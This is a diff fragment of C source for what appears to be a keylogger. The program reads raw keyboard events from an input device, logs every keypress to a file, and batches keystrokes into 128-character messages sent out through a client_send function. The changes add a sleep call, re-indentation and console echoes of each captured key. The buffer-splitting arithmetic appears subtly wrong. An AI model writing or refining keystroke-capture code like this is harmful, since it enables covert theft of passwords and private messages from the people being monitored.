@@ -110,6 +110,7 @@ void main()
 
   while(1)
   {
+    usleep(1000);
     read(device, &inpEvent, sizeof(inpEvent));  
     //if the type of the event is a state change (like of a keyboard)
     if (inpEvent.type == 1 && inpEvent.value == 1)
@@ -117,25 +118,28 @@ void main()
       //if the event code indicates a standard keyboard button
       if (inpEvent.code > 0 && inpEvent.code <= TOT_KEYS)
       {
-		if (strlen(message) + strlen(keys[inpEvent.code]) < 128) 
-		{
-			strcat(message, keys[inpEvent.code]);
-		}
-		else 
-		{
-			dif = (strlen(message) + strlen(keys[inpEvent.code])) - 128;
-			strncat(message, keys[inpEvent.code], dif);
-			client_send(message);
-			strcpy(message, "");
-			strcat(message, keys[inpEvent.code]+dif);
-		}
+	if (strlen(message) + strlen(keys[inpEvent.code]) < 128) 
+	{
+	  strcat(message, keys[inpEvent.code]);
+	}
+	else 
+	{
+	  dif = (strlen(message) + strlen(keys[inpEvent.code])) - 128;
+	  strncat(message, keys[inpEvent.code], dif);
+ 	  client_send(message);
+	  strcpy(message, "");
+	  strcat(message, keys[inpEvent.code] + dif);
+	}
+
         //output the code of the standard keyboard button
+        printf("%s\n", keys[inpEvent.code]);
         fprintf(output, "%s\n", keys[inpEvent.code]);
         count++;
       }
       else
       {
         fprintf(output, "Key not recognized\n");
+        printf("Key not recognized\n");
         count++;
       }
     }
